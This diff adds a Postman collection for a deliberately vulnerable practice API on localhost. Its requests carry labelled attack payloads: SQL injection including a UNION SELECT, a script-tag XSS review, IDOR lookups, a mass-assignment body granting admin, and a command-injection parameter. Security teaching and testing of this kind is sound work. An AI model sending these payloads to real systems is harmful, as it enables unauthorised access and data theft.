@@ -1,0 +1,134 @@
+{
+  "info": {
+    "name": "Vulnerable API",
+    "description": "Collection for the deliberately vulnerable API lab",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "Auth",
+      "item": [
+        {
+          "name": "Register",
+          "request": {
+            "method": "POST",
+            "url": "http://localhost:8080/auth/register",
+            "header": ["Content-Type: application/json"],
+            "body": { "mode": "raw", "raw": "{\"username\":\"student\",\"email\":\"student@test.com\",\"password\":\"password123\"}" }
+          }
+        },
+        {
+          "name": "Login",
+          "request": {
+            "method": "POST",
+            "url": "http://localhost:8080/auth/login",
+            "header": ["Content-Type: application/json"],
+            "body": { "mode": "raw", "raw": "{\"username\":\"alice\",\"password\":\"alice\"}" }
+          }
+        },
+        {
+          "name": "Reset Password",
+          "request": {
+            "method": "POST",
+            "url": "http://localhost:8080/auth/reset-password",
+            "header": ["Content-Type: application/json"],
+            "body": { "mode": "raw", "raw": "{\"email\":\"admin@sec-lab.local\"}" }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Users",
+      "item": [
+        {
+          "name": "Search Users (SQLi)",
+          "request": {
+            "method": "GET",
+            "url": "http://localhost:8080/users/search?q=alice' OR '1'='1"
+          }
+        },
+        {
+          "name": "My Profile",
+          "request": { "method": "GET", "url": "http://localhost:8080/users/profile" }
+        },
+        {
+          "name": "User by ID (IDOR)",
+          "request": { "method": "GET", "url": "http://localhost:8080/users/1" }
+        },
+        {
+          "name": "Update User (Mass Assignment)",
+          "request": {
+            "method": "PUT",
+            "url": "http://localhost:8080/users/2",
+            "header": ["Content-Type: application/json"],
+            "body": { "mode": "raw", "raw": "{\"role\":\"admin\"}" }
+          }
+        },
+        {
+          "name": "User Orders (IDOR)",
+          "request": { "method": "GET", "url": "http://localhost:8080/users/1/orders" }
+        }
+      ]
+    },
+    {
+      "name": "Products",
+      "item": [
+        {
+          "name": "List Products (SQLi)",
+          "request": { "method": "GET", "url": "http://localhost:8080/products?category=Electronics' OR '1'='1" }
+        },
+        {
+          "name": "Search Products (SQLi)",
+          "request": { "method": "GET", "url": "http://localhost:8080/products/search?q=Laptop' UNION SELECT 1,version(),3,4,5,6--" }
+        },
+        {
+          "name": "Post Review (XSS)",
+          "request": {
+            "method": "POST",
+            "url": "http://localhost:8080/products/1/reviews",
+            "header": ["Content-Type: application/json"],
+            "body": { "mode": "raw", "raw": "{\"comment\":\"<script>alert(1)</script>\",\"rating\":5}" }
+          }
+        },
+        {
+          "name": "Get Reviews",
+          "request": { "method": "GET", "url": "http://localhost:8080/products/1/reviews" }
+        },
+        {
+          "name": "Debug Env",
+          "request": { "method": "GET", "url": "http://localhost:8080/products/debug/env" }
+        }
+      ]
+    },
+    {
+      "name": "Admin",
+      "item": [
+        {
+          "name": "Config (No Auth)",
+          "request": { "method": "GET", "url": "http://localhost:8080/admin/config" }
+        },
+        {
+          "name": "All Users",
+          "request": { "method": "GET", "url": "http://localhost:8080/admin/users" }
+        },
+        {
+          "name": "Export HTML (XSS)",
+          "request": { "method": "GET", "url": "http://localhost:8080/admin/users/export?format=html" }
+        },
+        {
+          "name": "Command Injection",
+          "request": { "method": "GET", "url": "http://localhost:8080/admin/logs?cmd=ls%20-la" }
+        },
+        {
+          "name": "Impersonate User",
+          "request": {
+            "method": "POST",
+            "url": "http://localhost:8080/admin/users/impersonate",
+            "header": ["Content-Type: application/json"],
+            "body": { "mode": "raw", "raw": "{\"user_id\":1}" }
+          }
+        }
+      ]
+    }
+  ]
+}
